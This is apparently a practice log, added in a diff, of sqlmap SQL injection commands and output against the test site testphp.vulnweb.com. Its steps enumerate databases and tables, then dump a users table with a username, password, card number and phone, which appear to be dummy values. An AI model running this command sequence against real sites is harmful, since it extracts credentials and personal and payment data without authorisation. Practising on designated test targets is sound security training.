@@ -1,0 +1,83 @@
+└─$ sqlmap -u http://testphp.vulnweb.com/artists.php?artist=2   
+
+└─$ sqlmap -u http://testphp.vulnweb.com/artists.php?artist=2 --dbs
+[10:01:00] [INFO] fetching database names
+available databases [2]:
+[*] acuart
+[*] information_schema
+
+└─$ sqlmap -u http://testphp.vulnweb.com/artists.php?artist=2 -D acuart --tables
+[10:03:42] [INFO] fetching tables for database: 'acuart'
+Database: acuart
+[8 tables]
++-----------+
+| artists   |
+| carts     |
+| categ     |
+| featured  |
+| guestbook |
+| pictures  |
+| products  |
+| users     |
++-----------+
+
+└─$ sqlmap -u http://testphp.vulnweb.com/artists.php?artist=2 -D acuart -T users -dump
+Database: acuart
+Table: users
+[1 entry]
++---------------------+----------------------------------+-------+------+-----------------+-----------+-------+-----------+
+| cc                  | cart                             | name  | pass | email           | phone     | uname | address   |
++---------------------+----------------------------------+-------+------+-----------------+-----------+-------+-----------+
+| 1234-5678-2300-9000 | 4f37ccde799c84c4fa657ff2826c69d0 | ameen | test | email@email.com | 774587604 | test  | 21 street |
++---------------------+----------------------------------+-------+------+-----------------+-----------+-------+-----------+
+
+└─$ sqlmap -u http://testphp.vulnweb.com/artists.php?artist=2 -D acuart -T users --columns
+[10:09:40] [INFO] fetching columns for table 'users' in database 'acuart'
+Database: acuart
+Table: users
+[8 columns]
++---------+--------------+
+| Column  | Type         |
++---------+--------------+
+| address | mediumtext   |
+| cart    | varchar(100) |
+| cc      | varchar(100) |
+| email   | varchar(100) |
+| name    | varchar(100) |
+| pass    | varchar(100) |
+| phone   | varchar(100) |
+| uname   | varchar(100) |
++---------+--------------+
+
+└─$ sqlmap -u http://testphp.vulnweb.com/artists.php?artist=2 -D acuart -T users -C uname --dump
+[10:17:40] [INFO] fetching entries of column(s) 'uname' for table 'users' in database 'acuart'
+Database: acuart
+Table: users
+[1 entry]
++-------+
+| uname |
++-------+
+| test  |
++-------+
+
+└─$ sqlmap -u http://testphp.vulnweb.com/artists.php?artist=2 -D acuart -T users -C pass --dump 
+[10:18:43] [INFO] fetching entries of column(s) 'pass' for table 'users' in database 'acuart'
+Database: acuart
+Table: users
+[1 entry]
++------+
+| pass |
++------+
+| test |
++------+
+
+└─$ sqlmap -u http://testphp.vulnweb.com/artists.php?artist=2 -D acuart -T users -C phone --dump
+[10:20:25] [INFO] fetching entries of column(s) 'phone' for table 'users' in database 'acuart'
+Database: acuart
+Table: users
+[1 entry]
++-----------+
+| phone     |
++-----------+
+| 774587604 |
++-----------+
